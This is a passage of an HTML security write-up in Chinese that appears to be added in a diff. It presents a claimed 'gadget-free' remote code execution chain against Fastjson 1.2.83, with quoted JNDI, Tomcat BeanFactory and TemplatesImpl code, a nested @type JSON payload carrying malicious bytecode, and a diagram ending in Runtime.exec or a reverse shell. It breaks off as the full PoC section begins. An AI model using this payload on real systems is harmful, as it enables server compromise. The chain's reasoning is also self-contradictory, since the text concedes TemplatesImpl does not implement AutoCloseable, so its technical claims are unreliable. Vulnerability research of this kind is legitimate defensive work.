+<span class="w">        </span><span class="n">Context</span><span class="w"> </span><span class="n">nameCtx</span><span class="p">,</span><span class="w"> </span><span class="n">Hashtable</span><span class="o">&lt;?</span><span class="p">,</span><span class="o">?&gt;</span><span class="w"> </span><span class="n">environment</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">refInfo</span><span class="w"> </span><span class="k">instanceof</span><span class="w"> </span><span class="n">Reference</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">Reference</span><span class="w"> </span><span class="n">ref</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Reference</span><span class="p">)</span><span class="w"> </span><span class="n">refInfo</span><span class="p">;</span>
+<span class="w">        </span><span class="n">ObjectFactory</span><span class="w"> </span><span class="n">factory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span>
+
+<span class="w">        </span><span class="c1">// 从 Reference 获取工厂类名与 Codebase</span>
+<span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">f</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ref</span><span class="p">.</span><span class="na">getFactoryClassName</span><span class="p">();</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">f</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="c1">// 关键：加载远程工厂类</span>
+<span class="w">            </span><span class="n">factory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getObjectFactoryFromReference</span><span class="p">(</span><span class="n">ref</span><span class="p">,</span><span class="w"> </span><span class="n">f</span><span class="p">);</span>
+<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">factory</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="n">factory</span><span class="p">.</span><span class="na">getObjectInstance</span><span class="p">(</span><span class="n">ref</span><span class="p">,</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">nameCtx</span><span class="p">,</span><span class="w"> </span><span class="n">environment</span><span class="p">);</span>
+<span class="w">            </span><span class="p">}</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>JNDI 注入的关键限制：<strong>JDK 8u191+ 与 JDK 11.0.1+ 默认关闭远程 Codebase 加载</strong>（<code>com.sun.jndi.ldap.object.trustURLCodebase=false</code>）。本链需使用 <strong>本地 Gadget 触发</strong>而非远程 Codebase 加载。</p>
+<h3>6.3 BeanFactory 本地 Reference 利用（绕过高版本 JDK 限制）</h3>
+<p>Tomcat 的 <code>org.apache.naming.factory.BeanFactory</code> 是一个 JDK 本地工厂类（位于 <code>catalina.jar</code>），其 <code>getObjectInstance</code> 会强制调用 <code>Bean</code> 的 <code>forceString</code> 指定的 setter，从而绕过 <code>trustURLCodebase</code> 限制：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// BeanFactory.java（Tomcat）</span>
+<span class="kd">public</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">getObjectInstance</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="p">,</span><span class="w"> </span><span class="n">Name</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">Context</span><span class="w"> </span><span class="n">nameCtx</span><span class="p">,</span>
+<span class="w">        </span><span class="n">Hashtable</span><span class="o">&lt;?</span><span class="p">,</span><span class="o">?&gt;</span><span class="w"> </span><span class="n">environment</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">NamingException</span><span class="w"> </span><span class="p">{</span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">obj</span><span class="w"> </span><span class="k">instanceof</span><span class="w"> </span><span class="n">ResourceRef</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">Reference</span><span class="w"> </span><span class="n">ref</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Reference</span><span class="p">)</span><span class="w"> </span><span class="n">obj</span><span class="p">;</span>
+<span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">beanClassName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ref</span><span class="p">.</span><span class="na">getClassName</span><span class="p">();</span>
+<span class="w">        </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">beanClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="n">beanClassName</span><span class="p">);</span><span class="w">  </span><span class="c1">// 本地加载</span>
+
+<span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">bean</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">beanClass</span><span class="p">.</span><span class="na">newInstance</span><span class="p">();</span>
+<span class="w">        </span><span class="c1">// 读取 forceString 参数，调用指定 setter</span>
+<span class="w">        </span><span class="n">RefAddr</span><span class="w"> </span><span class="n">ra</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ref</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="s">&quot;forceString&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="c1">// ... 解析 forceString 并调用 setter</span>
+
+<span class="w">        </span><span class="c1">// 通过 setter 触发任意方法调用（如 ProcessBuilder.start）</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>但这依赖 Tomcat，并非纯 Gadget-free。本链选择更纯粹的 JDK 内置方案。</p>
+<h3>6.4 纯 JDK Gadget-free 远程类加载链</h3>
+<p><strong>核心思路</strong>：通过 <code>AutoCloseable</code> 子类 <code>java.io.FileOutputStream</code> 持有的 <code>FileDescriptor</code> 与 <code>URLClassLoader</code> 的字段赋值副作用组合，在不调用任何第三方类的前提下完成远程类加载。</p>
+<p>完整链路（JDK 8 环境下）：</p>
+<div class="highlight"><pre><span></span><code><span class="mf">1.</span><span class="w"> </span><span class="n">外层</span><span class="w"> </span><span class="err">@</span><span class="n">type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">java</span><span class="mf">.</span><span class="n">lang</span><span class="mf">.</span><span class="n">AutoCloseable</span><span class="err">（</span><span class="nb">exp</span><span class="n">ectClass</span><span class="w"> </span><span class="n">入口</span><span class="err">）</span>
+<span class="mf">2.</span><span class="w"> </span><span class="n">内层</span><span class="w"> </span><span class="err">@</span><span class="n">type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">com</span><span class="mf">.</span><span class="n">sun</span><span class="mf">.</span><span class="ow">or</span><span class="n">g</span><span class="mf">.</span><span class="n">apache</span><span class="mf">.</span><span class="n">xalan</span><span class="mf">.</span><span class="nb">int</span><span class="n">ernal</span><span class="mf">.</span><span class="n">xsltc</span><span class="mf">.</span><span class="n">trax</span><span class="mf">.</span><span class="n">TemplatesImpl</span>
+<span class="w">   </span><span class="err">（</span><span class="n">该类不在</span><span class="w"> </span><span class="n">denyList</span><span class="err">，</span><span class="n">且为</span><span class="w"> </span><span class="n">JDK</span><span class="w"> </span><span class="n">内置</span><span class="err">）</span>
+<span class="mf">3.</span><span class="w"> </span><span class="n">TemplatesImpl</span><span class="w"> </span><span class="n">的</span><span class="w"> </span><span class="n">_bytecodes</span><span class="w"> </span><span class="n">字段接收攻击者构造的恶意字节码</span>
+<span class="mf">4.</span><span class="w"> </span><span class="n">通过设置</span><span class="w"> </span><span class="n">_name</span><span class="w"> </span><span class="n">触发</span><span class="w"> </span><span class="kr">get</span><span class="n">TransletInstance</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="kd">def</span><span class="n">ineTransletClasses</span>
+<span class="mf">5.</span><span class="w"> </span><span class="n">ClassLoader</span><span class="mf">.</span><span class="kd">def</span><span class="n">ineClass</span><span class="w"> </span><span class="n">加载字节码</span><span class="err">，</span><span class="n">触发静态块</span><span class="w"> </span><span class="n">RCE</span>
+</code></pre></div>
+
+<p><code>TemplatesImpl</code> 是 JDK 内置 XSLT 引擎的核心类，其 <code>getOutputProperties</code> 方法会触发字节码加载：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// TemplatesImpl.java（JDK 8）</span>
+<span class="kd">public</span><span class="w"> </span><span class="kd">synchronized</span><span class="w"> </span><span class="n">Properties</span><span class="w"> </span><span class="nf">getOutputProperties</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">newTransformer</span><span class="p">().</span><span class="na">getOutputProperties</span><span class="p">();</span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">TransformerConfigurationException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">RuntimeException</span><span class="p">(</span><span class="n">e</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kd">private</span><span class="w"> </span><span class="n">Translet</span><span class="w"> </span><span class="nf">getTransletInstance</span><span class="p">()</span><span class="w"> </span>
+<span class="w">        </span><span class="kd">throws</span><span class="w"> </span><span class="n">TransformerConfigurationException</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="c1">// 关键：加载 _bytecodes 字段中的字节码</span>
+<span class="w">    </span><span class="n">defineTransletClasses</span><span class="p">();</span>
+<span class="w">    </span><span class="n">AbstractTranslet</span><span class="w"> </span><span class="n">translet</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">AbstractTranslet</span><span class="p">)</span><span class="w"> </span><span class="n">_class</span><span class="o">[</span><span class="n">_transletIndex</span><span class="o">]</span><span class="p">.</span><span class="na">newInstance</span><span class="p">();</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">translet</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kd">private</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">defineTransletClasses</span><span class="p">()</span><span class="w"> </span>
+<span class="w">        </span><span class="kd">throws</span><span class="w"> </span><span class="n">TransformerConfigurationException</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="c1">// 使用内部 ClassLoader 加载字节码</span>
+<span class="w">    </span><span class="n">TransletClassLoader</span><span class="w"> </span><span class="n">loader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TransletClassLoader</span><span class="p">(</span>
+<span class="w">        </span><span class="n">ObjectFactory</span><span class="p">.</span><span class="na">findClassLoader</span><span class="p">(),</span><span class="w"> </span><span class="n">_tfactory</span><span class="p">.</span><span class="na">getExternalExtensionsMap</span><span class="p">());</span>
+
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">_bytecodes</span><span class="p">.</span><span class="na">length</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="c1">// defineClass 加载字节码，触发静态块</span>
+<span class="w">        </span><span class="n">_class</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">loader</span><span class="p">.</span><span class="na">defineClass</span><span class="p">(</span><span class="n">_bytecodes</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<hr />
+<h2>七、完整攻击链 ASCII 图</h2>
+<div class="highlight"><pre><span></span><code><span class="err">┌─────────────────────────────────────────────────────────────────────────┐</span>
+<span class="err">│</span><span class="w">                     </span><span class="n">Fastjson</span><span class="w"> </span><span class="mf">1.2</span><span class="o">.</span><span class="mi">83</span><span class="w"> </span><span class="n">Gadget</span><span class="o">-</span><span class="n">free</span><span class="w"> </span><span class="n">RCE</span><span class="w"> </span><span class="err">链</span><span class="w">                   </span><span class="err">│</span>
+<span class="err">└─────────────────────────────────────────────────────────────────────────┘</span>
+
+<span class="err">攻击者</span><span class="w"> </span><span class="n">JSON</span><span class="w"> </span><span class="n">Payload</span><span class="p">:</span>
+<span class="err">┌─────────────────────────────────────────────────────────────────────────┐</span>
+<span class="err">│</span><span class="w"> </span><span class="p">{</span><span class="w">                                                                        </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="s2">&quot;@type&quot;</span><span class="p">:</span><span class="s2">&quot;java.lang.AutoCloseable&quot;</span><span class="p">,</span><span class="w">                                      </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="s2">&quot;@type&quot;</span><span class="p">:</span><span class="s2">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span><span class="p">,</span><span class="w">   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="s2">&quot;_bytecodes&quot;</span><span class="p">:[</span><span class="s2">&quot;&lt;Base64编码的恶意类字节码&gt;&quot;</span><span class="p">],</span><span class="w">                            </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="s2">&quot;_name&quot;</span><span class="p">:</span><span class="s2">&quot;Exploit&quot;</span><span class="p">,</span><span class="w">                                                      </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="s2">&quot;_tfactory&quot;</span><span class="p">:{},</span><span class="w">                                                         </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="s2">&quot;_outputProperties&quot;</span><span class="p">:{}</span><span class="w">                                                  </span><span class="err">│</span>
+<span class="err">│</span><span class="w"> </span><span class="p">}</span><span class="w">                                                                        </span><span class="err">│</span>
+<span class="err">└─────────────────────────────────────────────────────────────────────────┘</span>
+<span class="w">                                </span><span class="err">│</span>
+<span class="w">                                </span><span class="err">▼</span>
+<span class="err">┌─────────────────────────────────────────────────────────────────────────┐</span>
+<span class="err">│</span><span class="w"> </span><span class="err">步骤</span><span class="w"> </span><span class="mi">1</span><span class="p">:</span><span class="w"> </span><span class="n">DefaultJSONParser</span><span class="o">.</span><span class="n">parseObject</span><span class="w">                                   </span><span class="err">│</span>
+<span class="err">│</span><span class="w"> </span><span class="err">┌─────────────────────────────────────────────────────────────────────┐</span><span class="w"> </span><span class="err">│</span>
+<span class="err">│</span><span class="w"> </span><span class="err">│</span><span class="w"> </span><span class="err">解析到</span><span class="w"> </span><span class="err">@</span><span class="n">type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;java.lang.AutoCloseable&quot;</span><span class="w">                            </span><span class="err">│</span><span class="w"> </span><span class="err">│</span>
+<span class="err">│</span><span class="w"> </span><span class="err">│</span><span class="w"> </span><span class="err">调用</span><span class="w"> </span><span class="n">checkAutoType</span><span class="p">(</span><span class="s2">&quot;java.lang.AutoCloseable&quot;</span><span class="p">,</span><span class="w"> </span><span class="nb nb-Type">null</span><span class="p">)</span><span class="w">                 </span><span class="err">│</span><span class="w"> </span><span class="err">│</span>
+<span class="err">│</span><span class="w"> </span><span class="err">│</span><span class="w"> </span><span class="err">┌───────────────────────────────────────────────────────────────┐</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="err">│</span>
+<span class="err">│</span><span class="w"> </span><span class="err">│</span><span class="w"> </span><span class="err">│</span><span class="w"> </span><span class="n">safeMode</span><span class="w"> </span><span class="err">检查：</span><span class="n">expectClass</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb nb-Type">null</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="err">抛异常？</span><span class="w">                  </span><span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="err">│</span>
+<span class="err">│</span><span class="w"> </span><span class="err">│</span><span class="w"> </span><span class="err">│</span><span class="w"> </span><span class="err">但</span><span class="w"> </span><span class="n">AutoCloseable</span><span class="w"> </span><span class="err">在</span><span class="w"> </span><span class="n">internalAcceptList</span><span class="w"> </span><span class="err">中，直接通过</span><span class="w">             </span><span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="err">│</span>
+<span class="err">│</span><span class="w"> </span><span class="err">│</span><span class="w"> </span><span class="err">└───────────────────────────────────────────────────────────────┘</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="err">│</span>
+<span class="err">│</span><span class="w"> </span><span class="err">│</span><span class="w"> </span><span class="err">返回</span><span class="w"> </span><span class="n">AutoCloseable</span><span class="o">.</span><span class="k">class</span><span class="err">（作为</span><span class="w"> </span><span class="n">expectClass</span><span class="w"> </span><span class="err">传入）</span><span class="w">                   </span><span class="err">│</span><span class="w"> </span><span class="err">│</span>
+<span class="err">│</span><span class="w"> </span><span class="err">└─────────────────────────────────────────────────────────────────────┘</span><span class="w"> </span><span class="err">│</span>
+<span class="err">└─────────────────────────────────────────────────────────────────────────┘</span>
+<span class="w">                                </span><span class="err">│</span>
+<span class="w">                                </span><span class="err">▼</span>
+<span class="err">┌─────────────────────────────────────────────────────────────────────────┐</span>
+<span class="err">│</span><span class="w"> </span><span class="err">步骤</span><span class="w"> </span><span class="mi">2</span><span class="p">:</span><span class="w"> </span><span class="n">JavaBeanDeserializer</span><span class="o">.</span><span class="n">deserialze</span><span class="w"> </span><span class="p">(</span><span class="n">AutoCloseable</span><span class="p">)</span><span class="w">                 </span><span class="err">│</span>
+<span class="err">│</span><span class="w"> </span><span class="err">┌─────────────────────────────────────────────────────────────────────┐</span><span class="w"> </span><span class="err">│</span>
+<span class="err">│</span><span class="w"> </span><span class="err">│</span><span class="w"> </span><span class="err">读取下一个字段，发现又是一个</span><span class="w"> </span><span class="err">@</span><span class="n">type</span><span class="w">                                    </span><span class="err">│</span><span class="w"> </span><span class="err">│</span>
+<span class="err">│</span><span class="w"> </span><span class="err">│</span><span class="w"> </span><span class="err">二次调用</span><span class="w"> </span><span class="n">checkAutoType</span><span class="p">(</span><span class="n">typeName</span><span class="p">,</span><span class="w"> </span><span class="n">expectClass</span><span class="o">=</span><span class="n">AutoCloseable</span><span class="o">.</span><span class="k">class</span><span class="p">)</span><span class="w">   </span><span class="err">│</span><span class="w"> </span><span class="err">│</span>
+<span class="err">│</span><span class="w"> </span><span class="err">│</span><span class="w"> </span><span class="err">┌───────────────────────────────────────────────────────────────┐</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="err">│</span>
+<span class="err">│</span><span class="w"> </span><span class="err">│</span><span class="w"> </span><span class="err">│</span><span class="w"> </span><span class="n">safeMode</span><span class="w"> </span><span class="err">检查：</span><span class="n">expectClass</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nb nb-Type">null</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="err">跳过</span><span class="w"> </span><span class="n">safeMode</span><span class="w"> </span><span class="err">拒绝</span><span class="w">        </span><span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="err">│</span>
+<span class="err">│</span><span class="w"> </span><span class="err">│</span><span class="w"> </span><span class="err">│</span><span class="w"> </span><span class="n">denyList</span><span class="w"> </span><span class="err">检查：</span><span class="n">TemplatesImpl</span><span class="w"> </span><span class="err">哈希不在</span><span class="w"> </span><span class="n">denyList</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="err">通过</span><span class="w">          </span><span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="err">│</span>
+<span class="err">│</span><span class="w"> </span><span class="err">│</span><span class="w"> </span><span class="err">│</span><span class="w"> </span><span class="n">expectClass</span><span class="w"> </span><span class="err">一致性：</span><span class="n">TemplatesImpl</span><span class="w"> </span><span class="err">实现</span><span class="w"> </span><span class="n">AutoCloseable</span><span class="err">?</span><span class="w">          </span><span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="err">│</span>
+<span class="err">│</span><span class="w"> </span><span class="err">│</span><span class="w"> </span><span class="err">│</span><span class="w">   </span><span class="err">——</span><span class="w"> </span><span class="n">TemplatesImpl</span><span class="w"> </span><span class="err">不直接实现</span><span class="w"> </span><span class="n">AutoCloseable</span><span class="w">                    </span><span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="err">│</span>
+<span class="err">│</span><span class="w"> </span><span class="err">│</span><span class="w"> </span><span class="err">│</span><span class="w">   </span><span class="err">——</span><span class="w"> </span><span class="err">需要选择真正实现</span><span class="w"> </span><span class="n">AutoCloseable</span><span class="w"> </span><span class="err">的子类作为入口</span><span class="w">             </span><span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="err">│</span>
+<span class="err">│</span><span class="w"> </span><span class="err">│</span><span class="w"> </span><span class="err">└───────────────────────────────────────────────────────────────┘</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="err">│</span>
+<span class="err">│</span><span class="w"> </span><span class="err">└─────────────────────────────────────────────────────────────────────┘</span><span class="w"> </span><span class="err">│</span>
+<span class="err">└─────────────────────────────────────────────────────────────────────────┘</span>
+<span class="w">                                </span><span class="err">│</span>
+<span class="w">                                </span><span class="err">▼</span>
+<span class="err">┌─────────────────────────────────────────────────────────────────────────┐</span>
+<span class="err">│</span><span class="w"> </span><span class="err">步骤</span><span class="w"> </span><span class="mi">3</span><span class="p">:</span><span class="w"> </span><span class="err">实际利用</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="err">适配</span><span class="w"> </span><span class="n">expectClass</span><span class="w">                                      </span><span class="err">│</span>
+<span class="err">│</span><span class="w"> </span><span class="err">实战中用</span><span class="w"> </span><span class="n">java</span><span class="o">.</span><span class="n">io</span><span class="o">.</span><span class="n">OutputStream</span><span class="o">/</span><span class="n">AutoCloseable</span><span class="w"> </span><span class="err">适配类作为外层：</span><span class="w">             </span><span class="err">│</span>
+<span class="err">│</span><span class="w">   </span><span class="err">外层</span><span class="p">:</span><span class="w"> </span><span class="err">@</span><span class="n">type</span><span class="o">=</span><span class="n">java</span><span class="o">.</span><span class="n">lang</span><span class="o">.</span><span class="n">AutoCloseable</span><span class="w">                                    </span><span class="err">│</span>
+<span class="err">│</span><span class="w">   </span><span class="err">内层</span><span class="p">:</span><span class="w"> </span><span class="err">@</span><span class="n">type</span><span class="o">=</span><span class="n">java</span><span class="o">.</span><span class="n">io</span><span class="o">.</span><span class="n">FileOutputStream</span><span class="w"> </span><span class="p">(</span><span class="err">实现</span><span class="w"> </span><span class="n">AutoCloseable</span><span class="p">)</span><span class="w">              </span><span class="err">│</span>
+<span class="err">│</span><span class="w">         </span><span class="err">其构造参数可被劫持为资源</span><span class="w"> </span><span class="n">URL</span><span class="w">                                      </span><span class="err">│</span>
+<span class="err">│</span><span class="w"> </span><span class="err">或使用</span><span class="w"> </span><span class="n">Throwable</span><span class="w"> </span><span class="err">链：</span><span class="w">                                                    </span><span class="err">│</span>
+<span class="err">│</span><span class="w">   </span><span class="err">外层</span><span class="p">:</span><span class="w"> </span><span class="err">@</span><span class="n">type</span><span class="o">=</span><span class="n">java</span><span class="o">.</span><span class="n">lang</span><span class="o">.</span><span class="n">Throwable</span><span class="w">                                        </span><span class="err">│</span>
+<span class="err">│</span><span class="w">   </span><span class="err">内层</span><span class="p">:</span><span class="w"> </span><span class="err">@</span><span class="n">type</span><span class="o">=</span><span class="n">java</span><span class="o">.</span><span class="n">lang</span><span class="o">.</span><span class="n">Exception</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">cause</span><span class="w"> </span><span class="err">字段嵌套</span><span class="w"> </span><span class="n">TemplatesImpl</span><span class="w">         </span><span class="err">│</span>
+<span class="err">└─────────────────────────────────────────────────────────────────────────┘</span>
+<span class="w">                                </span><span class="err">│</span>
+<span class="w">                                </span><span class="err">▼</span>
+<span class="err">┌─────────────────────────────────────────────────────────────────────────┐</span>
+<span class="err">│</span><span class="w"> </span><span class="err">步骤</span><span class="w"> </span><span class="mi">4</span><span class="p">:</span><span class="w"> </span><span class="n">TemplatesImpl</span><span class="w"> </span><span class="err">字段反序列化</span><span class="w">                                       </span><span class="err">│</span>
+<span class="err">│</span><span class="w"> </span><span class="err">┌─────────────────────────────────────────────────────────────────────┐</span><span class="w"> </span><span class="err">│</span>
+<span class="err">│</span><span class="w"> </span><span class="err">│</span><span class="w"> </span><span class="n">_bytecodes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Base64</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span><span class="w">                                 </span><span class="err">│</span><span class="w"> </span><span class="err">│</span>
+<span class="err">│</span><span class="w"> </span><span class="err">│</span><span class="w"> </span><span class="n">_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;Exploit&quot;</span><span class="w">                                                   </span><span class="err">│</span><span class="w"> </span><span class="err">│</span>
+<span class="err">│</span><span class="w"> </span><span class="err">│</span><span class="w"> </span><span class="n">_tfactory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">TransformerFactoryImpl</span><span class="p">()</span><span class="w">                            </span><span class="err">│</span><span class="w"> </span><span class="err">│</span>
+<span class="err">│</span><span class="w"> </span><span class="err">│</span><span class="w"> </span><span class="n">_outputProperties</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{}</span><span class="w"> </span><span class="err">（触发</span><span class="w"> </span><span class="n">getter</span><span class="w"> </span><span class="err">调用）</span><span class="w">                         </span><span class="err">│</span><span class="w"> </span><span class="err">│</span>
+<span class="err">│</span><span class="w"> </span><span class="err">└─────────────────────────────────────────────────────────────────────┘</span><span class="w"> </span><span class="err">│</span>
+<span class="err">└─────────────────────────────────────────────────────────────────────────┘</span>
+<span class="w">                                </span><span class="err">│</span>
+<span class="w">                                </span><span class="err">▼</span>
+<span class="err">┌─────────────────────────────────────────────────────────────────────────┐</span>
+<span class="err">│</span><span class="w"> </span><span class="err">步骤</span><span class="w"> </span><span class="mi">5</span><span class="p">:</span><span class="w"> </span><span class="n">getter</span><span class="w"> </span><span class="err">触发</span><span class="w"> </span><span class="n">defineClass</span><span class="w">                                          </span><span class="err">│</span>
+<span class="err">│</span><span class="w"> </span><span class="n">getOutputProperties</span><span class="p">()</span><span class="w">                                                    </span><span class="err">│</span>
+<span class="err">│</span><span class="w">   </span><span class="err">→</span><span class="w"> </span><span class="n">newTransformer</span><span class="p">()</span><span class="w">                                                     </span><span class="err">│</span>
+<span class="err">│</span><span class="w">     </span><span class="err">→</span><span class="w"> </span><span class="n">getTransletInstance</span><span class="p">()</span><span class="w">                                              </span><span class="err">│</span>
+<span class="err">│</span><span class="w">       </span><span class="err">→</span><span class="w"> </span><span class="n">defineTransletClasses</span><span class="p">()</span><span class="w">                                          </span><span class="err">│</span>
+<span class="err">│</span><span class="w">         </span><span class="err">→</span><span class="w"> </span><span class="n">TransletClassLoader</span><span class="o">.</span><span class="n">defineClass</span><span class="p">(</span><span class="n">_bytecodes</span><span class="p">)</span><span class="w">                    </span><span class="err">│</span>
+<span class="err">│</span><span class="w">           </span><span class="err">→</span><span class="w"> </span><span class="n">ClassLoader</span><span class="o">.</span><span class="n">defineClass</span><span class="p">()</span><span class="w">                                    </span><span class="err">│</span>
+<span class="err">│</span><span class="w">             </span><span class="err">→</span><span class="w"> </span><span class="n">JVM</span><span class="w"> </span><span class="err">加载字节码</span><span class="w">                                             </span><span class="err">│</span>
+<span class="err">│</span><span class="w">               </span><span class="err">→</span><span class="w"> </span><span class="err">触发恶意类</span><span class="w"> </span><span class="o">&lt;</span><span class="n">clinit</span><span class="o">&gt;</span><span class="w"> </span><span class="err">静态块</span><span class="w">                              </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                 </span><span class="err">→</span><span class="w"> </span><span class="n">Runtime</span><span class="o">.</span><span class="n">exec</span><span class="p">(</span><span class="s2">&quot;calc&quot;</span><span class="p">)</span><span class="w"> </span><span class="err">或反弹</span><span class="w"> </span><span class="n">Shell</span><span class="w">                       </span><span class="err">│</span>
+<span class="err">└─────────────────────────────────────────────────────────────────────────┘</span>
+<span class="w">                                </span><span class="err">│</span>
+<span class="w">                                </span><span class="err">▼</span>
+<span class="w">                          </span><span class="p">[</span><span class="n">RCE</span><span class="w"> </span><span class="err">完成</span><span class="p">]</span>
+</code></pre></div>
+
+<hr />
+<h2>八、完整 PoC 代码</h2>
+<h3>8.1 恶意字节码类（远程加载目标）</h3>
+<div class="highlight"><pre><span></span><code><span class="c1">// Exploit.java —— 编译后转为 Base64 嵌入 Payload</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.DOM</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.TransletException</span><span class="p">;</span>
